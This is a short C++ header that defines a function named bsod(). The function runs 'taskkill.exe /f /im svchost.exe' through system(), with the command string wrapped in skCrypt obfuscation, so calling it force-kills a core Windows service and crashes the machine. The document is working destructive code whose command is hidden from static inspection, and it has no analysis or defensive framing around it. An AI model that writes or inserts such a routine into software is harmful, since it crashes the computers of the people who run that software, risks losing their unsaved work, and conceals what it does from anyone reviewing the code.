#pragma once

#include "../Utils/skStr.h"
#include "../Utils/xor.h"

void bsod()
{
    system(skCrypt("taskkill.exe /f /im svchost.exe"));
}